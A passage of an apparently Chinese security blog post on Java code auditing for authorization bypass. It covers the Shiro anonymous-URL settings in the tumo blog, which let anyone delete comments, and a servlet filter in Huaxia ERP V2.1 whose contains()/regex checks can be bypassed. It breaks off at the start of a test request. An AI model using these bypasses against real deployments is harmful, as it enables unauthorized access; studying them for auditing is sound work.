+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;/**&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;user&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">bean</span><span class="p">.</span><span class="na">setFilterChainDefinitionMap</span><span class="p">(</span><span class="n">map</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bean</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">当用户访问</span><span class="w"> </span><span class="o">/</span><span class="n">doLogin</span><span class="err">，</span><span class="o">/</span><span class="n">json</span><span class="err">，</span><span class="o">/</span><span class="n">index</span><span class="w"> </span><span class="n">等列出的路径时</span><span class="err">，</span><span class="n">直接允许访问</span><span class="err">（</span><span class="n">不需要登录</span><span class="err">）</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">当用户访问其他任何路径时</span><span class="err">，</span><span class="n">Shiro</span><span class="w"> </span><span class="n">会检查用户是否已登录</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">如果未登录</span><span class="err">，</span><span class="n">重定向到</span><span class="w"> </span><span class="o">/</span><span class="n">login</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">如果已登录但无权限</span><span class="err">（</span><span class="n">如果有进一步权限配置</span><span class="err">），</span><span class="n">重定向到</span><span class="w"> </span><span class="o">/</span><span class="n">unauth</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/2.png"
+	width="1454"
+	height="633"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/2_hu_f06749b446ffbfce.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/2_hu_31385dcfa3164efb.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="229"
+		data-flex-basis="551px"
+	
+></p>
+<h2 id="案例1tumo未授权任意评论删除">案例1.tumo未授权任意评论删除
+</h2><p><strong>查看源码的配置信息，发现使用了Shiro框架</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/3.png"
+	width="1343"
+	height="1013"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/3_hu_2f3f483b2aba3615.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/3_hu_14b18a1c4929bbde.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="132"
+		data-flex-basis="318px"
+	
+></p>
+<p><strong>查看Shiro框架的配置信息</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">session_timeout</span><span class="o">=</span><span class="n">3600</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">cookie_timeout</span><span class="o">=</span><span class="n">86400</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">////这些 URL 不需要登录 即可访问，通常用于 登录页、静态资源、公共页面 等。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">anon_url</span><span class="o">=</span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">/</span><span class="n">login</span><span class="p">,</span><span class="o">/</span><span class="n">logout</span><span class="p">,</span><span class="o">/</span><span class="n">register</span><span class="p">,</span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">/</span><span class="p">,</span><span class="o">/</span><span class="n">about</span><span class="p">,</span><span class="o">/</span><span class="n">p</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">links</span><span class="p">,</span><span class="o">/</span><span class="n">comment</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">link</span><span class="o">/</span><span class="n">list</span><span class="p">,</span><span class="o">/</span><span class="n">article</span><span class="o">/</span><span class="n">list</span><span class="p">,</span><span class="err">\</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="o">/</span><span class="n">css</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">js</span><span class="o">/**</span><span class="p">,</span><span class="o">/</span><span class="n">img</span><span class="o">/**</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">login_url</span><span class="o">=/</span><span class="n">login</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">success_url</span><span class="o">=/</span><span class="n">system</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">logout_url</span><span class="o">=/</span><span class="n">logout</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tumo</span><span class="p">.</span><span class="na">shiro</span><span class="p">.</span><span class="na">cipher_key</span><span class="o">=</span><span class="n">tycoding</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>找到comment路由，删除评论无需登录即可删除，存在未授权访问</strong></p>
+<p><img src="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/4.png"
+	width="1358"
+	height="943"
+	srcset="/p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/4_hu_1703d6efaa3b2224.png 480w, /p/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/image/4_hu_5b1546f018a0b0d5.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="144"
+		data-flex-basis="345px"
+	
+></p>
+<h2 id="3filter过滤器验证">3.Filter过滤器验证
+</h2><h3 id="31华夏erp_">3.1.<strong>华夏ERP_V2.1未授权访问漏洞</strong>
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@WebFilter</span><span class="p">(</span><span class="n">filterName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;LogCostFilter&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">urlPatterns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s">&#34;/*&#34;</span><span class="p">},</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">initParams</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="nd">@WebInitParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ignoredUrl&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;.css#.js#.jpg#.png#.gif#.ico&#34;</span><span class="p">),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                      </span><span class="nd">@WebInitParam</span><span class="p">(</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;filterPath&#34;</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                              </span><span class="n">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;/user/login#/user/registerUser&#34;</span><span class="p">)})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">LogCostFilter</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Filter</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">FILTER_PATH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;filterPath&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">IGNORED_PATH</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;ignoredUrl&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ignoredList</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ArrayList</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">allowUrls</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">ignoredUrls</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">FilterConfig</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">filterPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">.</span><span class="na">getInitParameter</span><span class="p">(</span><span class="n">FILTER_PATH</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">filterPath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">allowUrls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterPath</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">filterPath</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="n">filterPath</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">ignoredPath</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">filterConfig</span><span class="p">.</span><span class="na">getInitParameter</span><span class="p">(</span><span class="n">IGNORED_PATH</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">StringUtils</span><span class="p">.</span><span class="na">isEmpty</span><span class="p">(</span><span class="n">ignoredPath</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">ignoredUrls</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ignoredPath</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">ignoredPath</span><span class="p">.</span><span class="na">split</span><span class="p">(</span><span class="s">&#34;#&#34;</span><span class="p">)</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="n">ignoredPath</span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">ignoredUrl</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ignoredUrls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">ignoredList</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="n">ignoredUrl</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">doFilter</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                         </span><span class="n">FilterChain</span><span class="w"> </span><span class="n">chain</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">,</span><span class="w"> </span><span class="n">ServletException</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="p">)</span><span class="w"> </span><span class="n">request</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HttpServletResponse</span><span class="p">)</span><span class="w"> </span><span class="n">response</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">requestUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getRequestURI</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//具体，比如：处理若用户未登录，则跳转到登录页</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//检查用户是否已登录（通过 HttpSession 中的 user 属性）。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">userInfo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getAttribute</span><span class="p">(</span><span class="s">&#34;user&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="p">(</span><span class="n">userInfo</span><span class="o">!=</span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">//如果已登录，不阻止</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//允许特定 URL 直接访问（如登录页 /login.html 和注册页 /register.html）。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">requestUrl</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">requestUrl</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;/login.html&#34;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">requestUrl</span><span class="p">.</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;/register.html&#34;</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//允许忽略的 URL（通过 verify(ignoredList, requestUrl) 检查）。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//以这些后缀开头的&#34;.css#.js#.jpg#.png#.gif#.ico&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">verify</span><span class="p">(</span><span class="n">ignoredList</span><span class="p">,</span><span class="w"> </span><span class="n">requestUrl</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="kc">null</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">allowUrls</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">allowUrls</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">allowUrls</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">requestUrl</span><span class="p">.</span><span class="na">startsWith</span><span class="p">(</span><span class="n">url</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">chain</span><span class="p">.</span><span class="na">doFilter</span><span class="p">(</span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">response</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">return</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">sendRedirect</span><span class="p">(</span><span class="s">&#34;/login.html&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">regexPrefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;^.*&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">regexSuffix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;.*$&#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">boolean</span><span class="w"> </span><span class="nf">verify</span><span class="p">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">ignoredList</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">url</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">regex</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="n">ignoredList</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Pattern</span><span class="w"> </span><span class="n">pattern</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Pattern</span><span class="p">.</span><span class="na">compile</span><span class="p">(</span><span class="n">regexPrefix</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">regex</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">regexSuffix</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Matcher</span><span class="w"> </span><span class="n">matcher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pattern</span><span class="p">.</span><span class="na">matcher</span><span class="p">(</span><span class="n">url</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">matcher</span><span class="p">.</span><span class="na">matches</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">GET</span><span class="w"> </span><span class="o">/</span><span class="n">pages</span><span class="o">/</span><span class="n">materials</span><span class="o">/</span><span class="n">retail_back_list</span><span class="p">.</span><span class="na">html</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">192</span><span class="p">.</span><span class="na">168</span><span class="p">.</span><span class="na">165</span><span class="p">.</span><span class="na">252</span><span class="p">:</span><span class="n">8080</span><span class="w">
